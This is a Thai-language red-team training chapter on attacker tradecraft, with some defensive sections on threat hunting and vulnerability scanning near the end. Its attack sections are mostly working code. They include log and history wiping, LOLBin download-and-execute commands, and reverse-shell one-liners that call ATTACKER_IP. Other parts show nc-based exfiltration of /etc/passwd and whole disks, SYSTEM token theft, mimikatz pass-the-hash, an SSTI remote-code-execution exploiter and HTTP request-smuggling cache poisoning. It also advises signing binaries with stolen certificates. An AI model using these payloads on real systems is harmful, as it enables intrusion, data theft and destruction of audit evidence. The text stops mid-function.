# ส่วนที่ 20: Advanced Tradecraft และ Operational Security

## ขั้นตอนที่ 191: Operational Security (OPSEC)

### OPSEC สำหรับ Red Teamers

```
OPSEC Process:
1. Identify Critical Information
2. Analyze Threats
3. Analyze Vulnerabilities
4. Assess Risk
5. Apply Countermeasures

OPSEC ที่ดี = แอบมองไม่เห็น
OPSEC ที่เลว = Blue Teamแก้เกมได้
```

### Attacker OPSEC Checklist

```markdown
## Pre-Operation OPSEC Checklist

### Infrastructure
- [ ] Use dedicated operation infrastructure (never personal)
- [ ] All servers registered under aliases/privacy protection
- [ ] Domain registration via privacy proxy service
- [ ] Payment via anonymous method (prepaid, crypto)
- [ ] Infrastructure provisioned from VPN/Tor
- [ ] No direct connection from home/office to C2
- [ ] Multiple layers of redirectors

### Digital Hygiene
- [ ] Dedicated VM for each operation
- [ ] No cross-contamination between operations
- [ ] Browser with clean profile (no cookies/history)
- [ ] VPN/proxy for all research
- [ ] Anonymous email for registration

### Tool Tradecraft
- [ ] Compile all tools fresh (defeat hash detection)
- [ ] Use malleable C2 profiles
- [ ] Sign binaries with valid (bought/stolen) cert
- [ ] Timestomp files to match target environment
- [ ] Clean metadata from all documents

### Communication Security
- [ ] Use encrypted channels only
- [ ] Out-of-band communication plan
- [ ] Code words for sensitive topics
- [ ] Minimal footprint - clean up after yourself
```

### Anonymization Stack

```bash
# Anonymization layers:
# You -> VPN -> Tor -> Target
# You -> VPN1 -> VPN2 -> VPN3 -> Target

# Tor over VPN setup
# 1. Connect to VPN first
# 2. Then use Tor Browser
tor-browser

# ProxyChains สำหรับ chain proxies
cat /etc/proxychains4.conf
# เพิ่ม proxies:
# socks5 127.0.0.1 9050   (Tor)
# socks5 proxy1:1080
# socks5 proxy2:1080

# Run command ผ่าน proxychains
proxychains4 -q nmap -sT TARGET_IP
proxychains4 -q python3 exploit.py

# Check IP
proxychains4 -q curl https://api.ipify.org
```

### Infrastructure Cleanup

```python
#!/usr/bin/env python3
# cleanup_infra.py - ล้างร่องรอย operation

import subprocess
import os
import glob

class InfraCleanup:
    def __init__(self):
        self.cleanup_log = []
    
    def clear_bash_history(self):
        """Clear command history"""
        # Clear current session
        os.environ['HISTSIZE'] = '0'
        os.environ['HISTFILESIZE'] = '0'
        
        # Overwrite history files
        history_files = [
            os.path.expanduser('~/.bash_history'),
            os.path.expanduser('~/.zsh_history'),
            os.path.expanduser('~/.history')
        ]
        
        for f in history_files:
            if os.path.exists(f):
                with open(f, 'w') as h:
                    pass  # Overwrite with empty
                self.cleanup_log.append(f"Cleared: {f}")
    
    def clear_logs(self):
        """Clear system logs"""
        log_files = [
            '/var/log/auth.log',
            '/var/log/syslog',
            '/var/log/messages',
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log'
        ]
        
        for f in log_files:
            if os.path.exists(f) and os.access(f, os.W_OK):
                with open(f, 'w') as lf:
                    pass
                self.cleanup_log.append(f"Cleared log: {f}")
    
    def remove_operation_artifacts(self, ops_dir):
        """Remove all operation files"""
        if os.path.exists(ops_dir):
            import shutil
            # Secure deletion (overwrite before delete)
            for f in glob.glob(f"{ops_dir}/**/*", recursive=True):
                if os.path.isfile(f):
                    self.secure_delete(f)
            shutil.rmtree(ops_dir)
            self.cleanup_log.append(f"Removed directory: {ops_dir}")
    
    def secure_delete(self, filepath):
        """Overwrite file ก่อนลบ"""
        file_size = os.path.getsize(filepath)
        
        with open(filepath, 'r+b') as f:
            # Overwrite with random data 3 times
            for _ in range(3):
                f.seek(0)
                f.write(os.urandom(file_size))
        
        os.remove(filepath)
    
    def report(self):
        print("\n=== Cleanup Report ===")
        for item in self.cleanup_log:
            print(f"  [+] {item}")
        print(f"Total actions: {len(self.cleanup_log)}")

cleaner = InfraCleanup()
cleaner.clear_bash_history()
cleaner.report()
```

---

## ขั้นตอนที่ 192: Living off the Land (LOL)

### LOLBins - Windows

```bash
# Living off the Land Binaries บน Windows

# certutil.exe - Download ไฟล์
certutil.exe -urlcache -split -f http://ATTACKER_IP/payload.exe C:\\Windows\\Temp\\payload.exe
certutil.exe -encode payload.exe payload.b64     # Base64 encode
certutil.exe -decode payload.b64 payload.exe     # Base64 decode

# bitsadmin.exe - Download
bitsadmin /transfer job http://ATTACKER_IP/payload.exe C:\\payload.exe

# powershell.exe - Download and execute
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER/payload.exe', 'C:\\tmp\\payload.exe')"
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/script.ps1')"

# mshta.exe - Execute HTA
mshta.exe http://ATTACKER_IP/payload.hta
mshta.exe javascript:a=(GetObject('script:http://ATTACKER_IP/payload.sct')).Exec();close();

# wscript/cscript - Execute script
wscript.exe //e:jscript payload.js
cscript.exe payload.vbs

# regsvr32 - Execute DLL
regsvr32 /s /n /u /i:http://ATTACKER_IP/payload.sct scrobj.dll

# msiexec - Install MSI
msiexec /quiet /i http://ATTACKER_IP/payload.msi

# wmic - Execute
wmic process call create "cmd /c whoami > C:\\output.txt"
wmic os get /format:"http://ATTACKER_IP/payload.xsl"

# odbcconf - Execute DLL
odbcconf /S /A {REGSVR "C:\\payload.dll"}

# rundll32 - Execute
rundll32.exe javascript:"..\\mshtml,RunHTMLApplication";...
rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL payload.dll

# regsvcs/regasm
regsvcs.exe payload.dll
regasm.exe payload.dll
```

### LOLBins - Linux

```bash
# Living off the Land บน Linux

# Python อ่านไฟล์ / execute
python3 -c "import urllib.request; urllib.request.urlretrieve('http://ATTACKER/payload', '/tmp/payload')"

# curl/wget download
curl -s http://ATTACKER_IP/payload -o /tmp/payload && chmod +x /tmp/payload && /tmp/payload
wget -q http://ATTACKER_IP/payload -O /tmp/payload && chmod +x /tmp/payload

# netcat reverse shell
cat /etc/passwd | nc ATTACKER_IP 9999
nc -e /bin/bash ATTACKER_IP 4444

# bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# PHP reverse shell
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# perl reverse shell
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'

# awk
awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; print c; while ((c |& getline) > 0) print |& s; close(c); } while(c != "exit") }}'

# SCP สำหรับ exfil
scp -P 22 /etc/passwd user@ATTACKER_IP:/tmp/

# dd สำหรับ exfil ผ่าน network
dd if=/dev/sda | nc ATTACKER_IP 9999
dd if=/etc/passwd | gzip | nc ATTACKER_IP 9999
```

### LOLBAS Script

```python
#!/usr/bin/env python3
# lolbas_finder.py - ค้นหา LOLBAS opportunities

import os
import subprocess

# LOLBins database
WINDOWS_LOLBINS = {
    'download': [
        {'binary': 'certutil', 'cmd': 'certutil.exe -urlcache -split -f {url} {outfile}'},
        {'binary': 'bitsadmin', 'cmd': 'bitsadmin /transfer job {url} {outfile}'},
        {'binary': 'powershell', 'cmd': 'powershell -c (New-Object Net.WebClient).DownloadFile({url},{outfile})'},
    ],
    'execute': [
        {'binary': 'mshta', 'cmd': 'mshta.exe {url}'},
        {'binary': 'wscript', 'cmd': 'wscript.exe {script}'},
        {'binary': 'regsvr32', 'cmd': 'regsvr32 /s /n /u /i:{url} scrobj.dll'},
    ],
    'bypass_uac': [
        {'binary': 'fodhelper', 'technique': 'Registry key manipulation'},
        {'binary': 'eventvwr', 'technique': 'Registry hijack'},
        {'binary': 'sdclt', 'technique': 'Control Panel hijack'},
    ]
}

def check_available_lolbins():
    """Check which LOLBins are available on system"""
    available = {}
    
    search_paths = [
        'C:\\Windows\\System32',
        'C:\\Windows\\SysWOW64'
    ]
    
    for category, lolbins in WINDOWS_LOLBINS.items():
        available[category] = []
        for lolbin in lolbins:
            binary = lolbin['binary'] + '.exe'
            for path in search_paths:
                full_path = os.path.join(path, binary)
                if os.path.exists(full_path):
                    available[category].append({
                        **lolbin,
                        'path': full_path,
                        'available': True
                    })
                    break
    
    return available

def print_available_lolbins():
    available = check_available_lolbins()
    
    print("\n=== Available LOLBins ===")
    for category, bins in available.items():
        print(f"\n[{category.upper()}]")
        for lolbin in bins:
            print(f"  + {lolbin['binary']}: {lolbin.get('path', 'N/A')}")

if __name__ == '__main__':
    print_available_lolbins()
```

---

## ขั้นตอนที่ 193: Token Manipulation

### Windows Token Manipulation

```python
#!/usr/bin/env python3
# token_manip.py - Windows Token Manipulation

import ctypes
import ctypes.wintypes

# Windows API Constants
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATE = 0x0004
TOKEN_QUERY = 0x0008
TOKEN_ALL_ACCESS = 0xF01FF
SECURITY_IMPERSONATION = 2
TOKEN_PRIMARY = 1

PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_DUP_HANDLE = 0x0040

kernel32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32

def list_process_tokens():
    """List all process tokens"""
    import win32api
    import win32security
    import win32con
    import psutil
    
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        try:
            processes.append({
                'pid': proc.pid,
                'name': proc.name(),
                'username': proc.username()
            })
        except:
            pass
    
    return processes

def steal_token(target_pid):
    """ขโมย token จากโปรเซส (mimikatz: sekurlsa::pth)"""
    # Open target process
    h_process = kernel32.OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,
        False,
        target_pid
    )
    
    if not h_process:
        print(f"[-] Failed to open process {target_pid}")
        return None
    
    # Open process token
    h_token = ctypes.wintypes.HANDLE()
    advapi32.OpenProcessToken(
        h_process,
        TOKEN_DUPLICATE | TOKEN_QUERY,
        ctypes.byref(h_token)
    )
    
    # Duplicate token
    h_dup_token = ctypes.wintypes.HANDLE()
    advapi32.DuplicateTokenEx(
        h_token,
        TOKEN_ALL_ACCESS,
        None,
        SECURITY_IMPERSONATION,
        TOKEN_PRIMARY,
        ctypes.byref(h_dup_token)
    )
    
    kernel32.CloseHandle(h_token)
    kernel32.CloseHandle(h_process)
    
    print(f"[+] Token stolen from PID {target_pid}")
    return h_dup_token

def impersonate_system():
    """Impersonate SYSTEM token"""
    import win32security
    import win32api
    import psutil
    
    # Find SYSTEM process
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        if proc.name() == 'winlogon.exe':
            token = steal_token(proc.pid)
            if token:
                # Impersonate
                advapi32.ImpersonateLoggedOnUser(token)
                print("[+] Impersonating SYSTEM")
                return True
    return False

# PowerShell version
PS_TOKEN_MANIPULATION = """
# Check current identity
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Impersonate using PsExec-style
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal $identity
$principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Token manipulation via mimikatz
Invoke-Mimikatz -Command '"token::elevate"'
Invoke-Mimikatz -Command '"token::list"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:cmd.exe"'
"""
```

---

## ขั้นตอนที่ 194: Kernel Exploitation

### Local Privilege Escalation via Kernel Vuln

```python
#!/usr/bin/env python3
# kernel_exploit_scanner.py - ค้นหา kernel vulnerabilities

import subprocess
import platform
import re

def get_kernel_info():
    """ดึงข้อมูล kernel"""
    info = {}
    
    # Linux
    if platform.system() == 'Linux':
        result = subprocess.run(['uname', '-a'], capture_output=True, text=True)
        info['uname'] = result.stdout.strip()
        
        # ดึง kernel version
        with open('/proc/version', 'r') as f:
            info['version'] = f.read().strip()
        
        # ดึง OS release
        try:
            with open('/etc/os-release', 'r') as f:
                info['os_release'] = f.read()
        except:
            pass
    
    return info

def check_linux_privesc():
    """ตรวจสอบ Linux PrivEsc vectors"""
    vectors = []
    
    # SUID binaries
    result = subprocess.run(
        ['find', '/', '-perm', '-4000', '-type', 'f', '2>/dev/null'],
        capture_output=True, text=True, shell=False
    )
    suid_bins = result.stdout.strip().split('\n')
    for binary in suid_bins:
        if binary:
            vectors.append({'type': 'SUID', 'binary': binary})
    
    # Writable /etc/passwd
    if os.access('/etc/passwd', os.W_OK):
        vectors.append({'type': 'Writable', 'file': '/etc/passwd'})
    
    # Sudo permissions
    result = subprocess.run(['sudo', '-l'], capture_output=True, text=True)
    if result.returncode == 0:
        vectors.append({'type': 'Sudo', 'permissions': result.stdout})
    
    # Capabilities
    result = subprocess.run(
        ['getcap', '-r', '/'],
        capture_output=True, text=True
    )
    if result.stdout:
        vectors.append({'type': 'Capabilities', 'data': result.stdout})
    
    # Cron jobs
    cron_dirs = ['/etc/cron.d', '/etc/cron.daily', '/var/spool/cron']
    for cron_dir in cron_dirs:
        if os.path.exists(cron_dir):
            vectors.append({'type': 'Cron', 'directory': cron_dir})
    
    return vectors

# Kernel Exploit Suggester
KNOWN_KERNELVULNS = {
    '2.6.22': ['CVE-2010-3301', 'CVE-2012-0056'],
    '3.x': ['CVE-2015-1328', 'CVE-2016-5195 (DirtyCow)'],
    '4.x': ['CVE-2017-6074', 'CVE-2017-7308'],
    '5.x': ['CVE-2021-3156', 'CVE-2021-4034 (PwnKit)']
}

def suggest_exploits(kernel_version):
    """Suggest exploits สำหรับ kernel version"""
    suggestions = []
    
    for version, cves in KNOWN_KERNELVULNS.items():
        if version in kernel_version:
            suggestions.extend(cves)
    
    # Check specific CVEs
    major, minor = map(int, re.findall(r'\d+', kernel_version)[:2])
    
    if major < 4 or (major == 4 and minor < 14):
        suggestions.append('CVE-2016-5195 (DirtyCow) - Very likely')
    
    if major < 5 or (major == 5 and minor < 11):
        suggestions.append('CVE-2021-3156 (sudo heap overflow)')
    
    return suggestions

kernel_info = get_kernel_info()
print("Kernel Info:")
for k, v in kernel_info.items():
    print(f"  {k}: {v[:100] if isinstance(v, str) else v}")

vectors = check_linux_privesc()
print(f"\n[+] Found {len(vectors)} privilege escalation vectors")
for v in vectors[:10]:
    print(f"  [{v['type']}] {v.get('binary', v.get('file', v.get('permissions', '')[:50]))}")
```

### DirtyCow Exploit (CVE-2016-5195)

```c
// dirtycow_check.c - Check ว่า system ไวต่อ DirtyCow หรือไม่
// Compile: gcc -o dirtycow_check dirtycow_check.c

#include <stdio.h>
#include <stdlib.h>
#include <sys/utsname.h>
#include <string.h>

int is_vulnerable_kernel(const char *kernel_version) {
    int major, minor, patch;
    sscanf(kernel_version, "%d.%d.%d", &major, &minor, &patch);
    
    // Vulnerable: <= 4.8.2
    if (major < 4) return 1;
    if (major == 4 && minor < 8) return 1;
    if (major == 4 && minor == 8 && patch <= 2) return 1;
    
    return 0;
}

int main() {
    struct utsname buf;
    uname(&buf);
    
    printf("Kernel: %s\n", buf.release);
    
    if (is_vulnerable_kernel(buf.release)) {
        printf("[!] POTENTIALLY VULNERABLE to DirtyCow (CVE-2016-5195)\n");
        printf("    Check: https://github.com/dirtycow/dirtycow.github.io\n");
    } else {
        printf("[+] Kernel version suggests DirtyCow patch applied\n");
    }
    
    return 0;
}
```

---

## ขั้นตอนที่ 195: Supply Chain Attacks

### NPM Package Attack Simulation

```python
#!/usr/bin/env python3
# supply_chain_awareness.py - ทำความเข้าใจ supply chain attacks

# ตัวอย่างเพื่อการเรียนรู้เท่านั้น

def analyze_package_for_risks(package_name, version):
    """วิเคราะห์ความเสี่ยงของ package"""
    risks = []
    
    # ความเสี่ยงที่ควรตรวจสอบ
    risk_indicators = [
        {
            'type': 'Dependency Confusion',
            'description': 'ตรวจสอบว่ามี package ชื่อเดียวกันใน public registry หรือไม่',
            'mitigation': 'Lock dependencies, use private registry'
        },
        {
            'type': 'Typosquatting',
            'description': 'ชื่อ package คล้ายกับของจริงแต่เขียนผิด
(e.g., lodash vs iodash)',
            'mitigation': 'Verify exact package names'
        },
        {
            'type': 'Malicious Updates',
            'description': 'Package ถูกเพิ่ม malicious code ในเวอร์ชันใหม่',
            'mitigation': 'Lock to specific versions, audit updates'
        },
        {
            'type': 'Account Takeover',
            'description': 'ผู้ดูแล package ถูกแฮก account และเพิ่ม malware',
            'mitigation': 'Use MFA, code signing, verify maintainers'
        }
    ]
    
    return risk_indicators

def detect_suspicious_package_code(package_path):
    """ตรวจหา suspicious code ใน package"""
    import ast
    import glob
    
    suspicious_patterns = [
        'os.system',
        'subprocess.call',
        'eval(',
        'exec(',
        '__import__',
        'socket.connect',
        'urllib.request',
        'requests.get',
        'base64.decode',
        '/etc/passwd',
        'HOME',
        '.ssh',
        'credentials'
    ]
    
    findings = []
    
    for py_file in glob.glob(f"{package_path}/**/*.py", recursive=True):
        with open(py_file, 'r', errors='ignore') as f:
            content = f.read()
        
        for pattern in suspicious_patterns:
            if pattern in content:
                findings.append({
                    'file': py_file,
                    'pattern': pattern,
                    'risk': 'Medium'
                })
    
    return findings

def check_npm_package_integrity(package_name):
    """ตรวจสอบความถูกต้องของ NPM package"""
    import subprocess
    import json
    
    result = subprocess.run(
        ['npm', 'audit', '--json'],
        capture_output=True, text=True, cwd=package_name
    )
    
    if result.stdout:
        audit = json.loads(result.stdout)
        return {
            'vulnerabilities': audit.get('metadata', {}).get('vulnerabilities', {}),
            'dependencies': audit.get('metadata', {}).get('dependencies', {})
        }
    return None

risks = analyze_package_for_risks('lodash', '4.17.15')
print("\n=== Supply Chain Attack Risks ===")
for risk in risks:
    print(f"\n[{risk['type']}]")
    print(f"  Description: {risk['description']}")
    print(f"  Mitigation: {risk['mitigation']}")
```

---

## ขั้นตอนที่ 196: Advanced Web Attacks

### Server-Side Template Injection (SSTI) Advanced

```python
#!/usr/bin/env python3
# ssti_advanced.py - Advanced SSTI Attacks

import requests
import urllib.parse

class SSTIExploiter:
    def __init__(self, url, param):
        self.url = url
        self.param = param
        self.engine = None
    
    def detect_engine(self):
        """ตรวจหา Template Engine"""
        payloads = {
            'jinja2': '{{7*7}}',
            'twig': '{{7*7}}',
            'erb': '<%= 7*7 %>',
            'freemarker': '${7*7}',
            'velocity': '#set($x=7*7)$x',
            'tornado': '{{ 7*7 }}',
        }
        
        for engine, payload in payloads.items():
            resp = requests.get(
                self.url,
                params={self.param: payload}
            )
            if '49' in resp.text:
                self.engine = engine
                print(f"[+] Template engine detected: {engine}")
                return engine
        
        return None
    
    def exploit_jinja2(self, command):
        """Exploit Jinja2 SSTI"""
        payloads = [
            # Basic RCE
            "{{config.__class__.__init__.__globals__['os'].popen('" + command + "').read()}}",
            # Alternative
            "{{request.application.__globals__.__builtins__.__import__('os').popen('" + command + "').read()}}",
            # Via __mro__
            "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('" + command + "').read()}}",
        ]
        
        for payload in payloads:
            try:
                resp = requests.get(
                    self.url,
                    params={self.param: payload}
                )
                if resp.status_code == 200 and len(resp.text) > 0:
                    output = resp.text.strip()
                    if output and output != payload:  # Got actual output
                        print(f"[+] Command output: {output}")
                        return output
            except:
                continue
        
        return None
    
    def exploit_freemarker(self, command):
        """Exploit Freemarker SSTI"""
        payload = f'<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("{command}")}}'
        
        resp = requests.post(
            self.url,
            data={self.param: payload}
        )
        
        return resp.text
    
    def exploit_tornado(self, command):
        """Exploit Tornado SSTI"""
        payload = '{{% import os %}}{{% print os.popen(\'{command}\').read() %}}'
        
        resp = requests.get(
            self.url,
            params={self.param: payload.format(command=command)}
        )
        
        return resp.text
    
    def auto_exploit(self, command):
        """Auto detect และ exploit"""
        engine = self.detect_engine()
        
        if engine == 'jinja2':
            return self.exploit_jinja2(command)
        elif engine == 'freemarker':
            return self.exploit_freemarker(command)
        elif engine == 'tornado':
            return self.exploit_tornado(command)
        else:
            print(f"[-] Unsupported engine: {engine}")
            return None

exploiter = SSTIExploiter('http://target.com/search', 'q')
exploiter.auto_exploit('id')
```

### HTTP Request Smuggling Advanced

```python
#!/usr/bin/env python3
# http_smuggling_advanced.py - Advanced HTTP Smuggling

import socket
import ssl
import time

class HTTPSmuggler:
    def __init__(self, host, port=80, use_ssl=False):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
    
    def send_raw(self, payload):
        """Send raw HTTP request"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        
        if self.use_ssl:
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=self.host)
        
        s.connect((self.host, self.port))
        s.send(payload)
        
        response = b''
        try:
            while True:
                data = s.recv(4096)
                if not data:
                    break
                response += data
        except:
            pass
        
        s.close()
        return response
    
    def test_cl_te(self):
        """Test CL.TE smuggling"""
        payload = (
            b'POST / HTTP/1.1\r\n'
            b'Host: ' + self.host.encode() + b'\r\n'
            b'Content-Type: application/x-www-form-urlencoded\r\n'
            b'Content-Length: 6\r\n'
            b'Transfer-Encoding: chunked\r\n'
            b'\r\n'
            b'0\r\n'
            b'\r\n'
            b'G'
        )
        
        resp = self.send_raw(payload)
        return resp
    
    def test_te_cl(self):
        """Test TE.CL smuggling"""
        payload = (
            b'POST / HTTP/1.1\r\n'
            b'Host: ' + self.host.encode() + b'\r\n'
            b'Content-Type: application/x-www-form-urlencoded\r\n'
            b'Content-Length: 4\r\n'
            b'Transfer-Encoding: chunked\r\n'
            b'\r\n'
            b'5c\r\n'
            b'GPOST / HTTP/1.1\r\n'
            b'Content-Type: application/x-www-form-urlencoded\r\n'
            b'Content-Length: 15\r\n'
            b'\r\n'
            b'x=1\r\n'
            b'0\r\n'
            b'\r\n'
        )
        
        resp = self.send_raw(payload)
        return resp
    
    def exploit_for_cache_poisoning(self, victim_path):
        """Use smuggling for cache poisoning"""
        # Smuggle request to cache poisoned response
        attack_header = f'GET {victim_path} HTTP/1.1\r\nFoo: bar'
        
        payload = (
            f'POST / HTTP/1.1\r\n'
            f'Host: {self.host}\r\n'
            f'Content-Type: application/x-www-form-urlencoded\r\n'
            f'Content-Length: {13 + len(attack_header)}\r\n'
            f'Transfer-Encoding: chunked\r\n'
            f'\r\n'
            f'0\r\n'
            f'\r\n'
            f'{attack_header}'
        ).encode()
        
        resp1 = self.send_raw(payload)
        print(f"[+] Smuggled request sent for {victim_path}")
        
        # Send follow-up request to get cached response
        time.sleep(0.1)
        normal_request = (
            f'GET {victim_path} HTTP/1.1\r\n'
            f'Host: {self.host}\r\n'
            f'\r\n'
        ).encode()
        
        resp2 = self.send_raw(normal_request)
        return resp2

smuggler = HTTPSmuggler('target.com', 80)
result = smuggler.test_cl_te()
print(result.decode('utf-8', errors='replace')[:500])
```

---

## ขั้นตอนที่ 197: Threat Hunting

### Threat Hunting with Python

```python
#!/usr/bin/env python3
# threat_hunter.py - Threat Hunting แบบ Python

import json
import re
from datetime import datetime

class ThreatHunter:
    def __init__(self):
        self.ioc_database = {
            'ip': set(),
            'domain': set(),
            'hash': set(),
            'url': set()
        }
        
        self.detection_rules = []
    
    def load_iocs_from_feed(self, feed_data):
        """โหลด IOCs จาก threat feed"""
        for ioc in feed_data:
            ioc_type = ioc.get('type', '').lower()
            value = ioc.get('value', '')
            
            if ioc_type in self.ioc_database:
                self.ioc_database[ioc_type].add(value)
        
        print(f"[+] Loaded IOCs: {sum(len(v) for v in self.ioc_database.values())} total")
    
    def hunt_in_logs(self, log_file, log_type='apache'):
        """ค้นหา IOCs ใน logs"""
        findings = []
        
        patterns = {
            'ip': r'\b(?:\d{1,3}\.){3}\d{1,3}\b',
            'domain': r'[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}',
            'hash_md5': r'\b[a-fA-F0-9]{32}\b',
            'hash_sha256': r'\b[a-fA-F0-9]{64}\b'
        }
        
        with open(log_file, 'r', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                # ค้นหา IP addresses
                ips = re.findall(patterns['ip'], line)
                for ip in ips:
                    if ip in self.ioc_database['ip']:
                        findings.append({
                            'type': 'ip_match',
                            'ioc': ip,
                            'line': line_num,
                            'evidence': line.strip()
                        })
                
                # ค้นหา domains
                domains = re.findall(patterns['domain'], line)
                for domain in domains:
                    if domain.lower() in self.ioc_database['domain']:
                        findings.append({
                            'type': 'domain_match',
                            'ioc': domain,
                            'line': line_num,
                            'evidence': line.strip()
                        })
        
        return findings
    
    def hunt_persistence(self):
        """ค้นหา persistence mechanisms"""
        import os
        findings = []
        
        # ตรวจสอบ crontab บน Linux
        cron_files = ['/etc/crontab', '/var/spool/cron']
        for f in cron_files:
            if os.path.exists(f):
                findings.append({'type': 'cron', 'path': f})
        
        # ตรวจสอบ startup scripts
        startup_files = [
            '/etc/rc.local',
            '/etc/init.d/',
            os.path.expanduser('~/.bashrc'),
            os.path.expanduser('~/.profile')
        ]
        
        for f in startup_files:
            if os.path.exists(f):
                findings.append({'type': 'startup', 'path': f})
        
        return findings
    
    def behavioral_analysis(self, process_list):
        """วิเคราะห์พฤติกรรมโปรเซส"""
        suspicious = []
        
        # Suspicious process names
        suspicious_names = [
            'nc', 'netcat', 'ncat',
            'meterpreter', 'msfconsole',
            'mimikatz', 'procdump',
            'psexec', 'winexec'
        ]
        
        # Suspicious parent-child relationships
        suspicious_parents = {
            'cmd.exe': ['powershell.exe', 'net.exe', 'whoami.exe'],
            'powershell.exe': ['cmd.exe', 'net.exe', 'wscript.exe'],
            'wscript.exe': ['cmd.exe', 'powershell.exe'],
            'mshta.exe': ['cmd.exe', 'powershell.exe'],
        }
        
        for proc in process_list:
            # Check suspicious names
            if proc['name'].lower() in suspicious_names:
                suspicious.append({
                    'reason': 'Suspicious process name',
                    'process': proc
                })
            
            # Check parent-child
            parent_name = proc.get('parent_name', '').lower()
            child_name = proc['name'].lower()
            
            if parent_name in suspicious_parents:
                if child_name in suspicious_parents[parent_name]:
                    suspicious.append({
                        'reason': f'Suspicious parent-child: {parent_name} -> {child_name}',
                        'process': proc
                    })
        
        return suspicious
    
    def generate_hunt_report(self, findings):
        """สร้างรายงาน Threat Hunt"""
        report = f"""
=== Threat Hunt Report ===
Date: {datetime.now().isoformat()}
Findings: {len(findings)}

"""
        for i, finding in enumerate(findings, 1):
            report += f"""
[{i}] Type: {finding.get('type', 'unknown')}
     IOC: {finding.get('ioc', 'N/A')}
     Evidence: {finding.get('evidence', '')[:100]}
     Line: {finding.get('line', 'N/A')}
"""
        
        return report

hunter = ThreatHunter()

# Load IOCs
test_iocs = [
    {'type': 'ip', 'value': '1.2.3.4'},
    {'type': 'domain', 'value': 'malware.com'},
    {'type': 'hash', 'value': 'abc123def456' * 2 + '789012345678'}
]
hunter.load_iocs_from_feed(test_iocs)

findings = hunter.hunt_persistence()
print(f"[+] Persistence mechanisms found: {len(findings)}")
for f in findings:
    print(f"  [{f['type']}] {f['path']}")
```

---

## ขั้นตอนที่ 198: Security Automation

### Automated Vulnerability Assessment

```python
#!/usr/bin/env python3
# auto_vuln_assess.py - Automated Vulnerability Assessment

import subprocess
import json
import xml.etree.ElementTree as ET
from datetime import datetime

class VulnAssessment:
    def __init__(self, target, output_dir='/tmp/vuln_scan'):
        self.target = target
        self.output_dir = output_dir
        self.findings = []
        import os
        os.makedirs(output_dir, exist_ok=True)
    
    def run_nmap_scan(self, ports='1-1000', scripts='vuln'):
        """รัน Nmap สแกน"""
        output_file = f"{self.output_dir}/nmap_{self.target.replace('.', '_')}.xml"
        
        cmd = [
            'nmap',
            '-sV',              # Service version
            '-sC',              # Default scripts
            f'--script={scripts}',
            '-p', ports,
            '-oX', output_file, # XML output
            self.target
        ]
        
        print(f"[*] Running Nmap scan on {self.target}...")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        
        if result.returncode == 0:
            return self.parse_nmap_xml(output_file)
        return []
    
    def parse_nmap_xml(self, xml_file):
        """วิเคราะห์ผลลัพธ์ Nmap XML"""
        findings = []
        
        tree = ET.parse(xml_file)
        root = tree.getroot()
        
        for host in root.findall('host'):
            for port in host.findall('.//port'):
                portid = port.get('portid')
                protocol = port.get('protocol')
                
                state = port.find('state')
                service = port.find('service')
                
                if state is not None and state.get('state') == 'open':
                    port_info = {
                        'port': portid,
                        'protocol': protocol,
                        'service': service.get('name') if service is not None else 'unknown',
                        'version': service.get('version') if service is not None else '',
                        'scripts': []
                    }
                    
                    # Parse script results
                    for script in port.findall('script'):
                        script_id = script.get('id')
                        script_output = script.get('output')
                        
                        # ค้นหา vulnerabilities
                        if 'VULNERABLE' in str(script_output) or 'CVE-' in str(script_output):
                            port_info['scripts'].append({
                                'id': script_id,
                                'output': script_output,
                                'severity': 'High'
                            })
                    
                    findings.append(port_info)
        
        return findings
    
    def run_nikto_scan(self, port=80):
        """Run Nikto web scan"""
        output_file = f"{self.output_dir}/nikto_{self.target}.json"
        
        cmd = [
            'nikto',
            '-h', self.target,
            '-p', str(port),
            '-Format', 'json',
            '-o', output_file
        ]
        
        print(f"[*] Running Nikto scan on {self.target}:{port}...")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        
        return output_file
    
    def check_cve_database(self, service_name, version):
        """ค้นหา CVEs สำหรับ service"""
        import requests
        
        # Query NVD API
        url = f"https://services.nvd.nist.gov/rest/json/cves/2.0"
        params = {
            'keywordSearch': f"{service_name} {version}",
            'resultsPerPage': 5
        }
        
        try:
            resp = requests.get(url, params=params, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                cves = []
                for vuln in data.get('vulnerabilities', [])[:5]:
                    cve = vuln.get('cve', {})
                    cves.append({
                        'id': cve.get('id'),
                        'description': cve.get('descriptions', [{}])[0].get('value', '')[:200]
                    })
